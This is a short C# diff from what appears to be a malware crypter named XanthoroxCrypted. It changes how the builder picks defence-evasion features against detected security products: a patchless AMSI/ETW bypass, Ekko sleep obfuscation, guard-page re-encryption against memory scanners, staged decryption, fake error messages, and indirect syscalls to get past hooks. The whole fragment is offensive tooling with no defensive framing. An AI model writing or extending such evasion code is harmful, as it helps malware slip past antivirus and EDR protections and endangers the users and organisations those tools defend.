@@ -141,11 +141,8 @@ namespace XanthoroxCrypted.Core
         {
             var config = new BuildConfig();
 
-            if (threatSurface.HasFlag(DetectionEngine.AMSIHook))
-                config.AMSI = true;
-
-            if (threatSurface.HasFlag(DetectionEngine.ETWTelemetry))
-                config.ETW = true;
+            if (threatSurface.HasFlag(DetectionEngine.AMSIHook) || threatSurface.HasFlag(DetectionEngine.ETWTelemetry))
+                config.PatchlessAmsiEtw = true;
 
             if (threatSurface.HasFlag(DetectionEngine.SandboxDetonation))
             {
@@ -159,7 +156,7 @@ namespace XanthoroxCrypted.Core
 
             if (threatSurface.HasFlag(DetectionEngine.MemoryScan))
             {
-                config.SleepObf = true;
+                config.EkkoSleep = true;
                 config.GuardPage = true;     // L14: Re-encrypt on scanner touch
                 config.StagedLoad = true;    // L39: Chunked decryption
             }
@@ -187,7 +184,7 @@ namespace XanthoroxCrypted.Core
                 config.FakeError = true;
 
             if (threatSurface.HasFlag(DetectionEngine.RootkitDetect))
-                config.Syscalls = true;      // L11: Direct syscalls bypass hooks
+                config.IndirectSyscalls = true;      // L11: Direct syscalls bypass hooks
 
             // Default execution method priority
             if (!config.PhantomDLL && !config.ThreadPool)
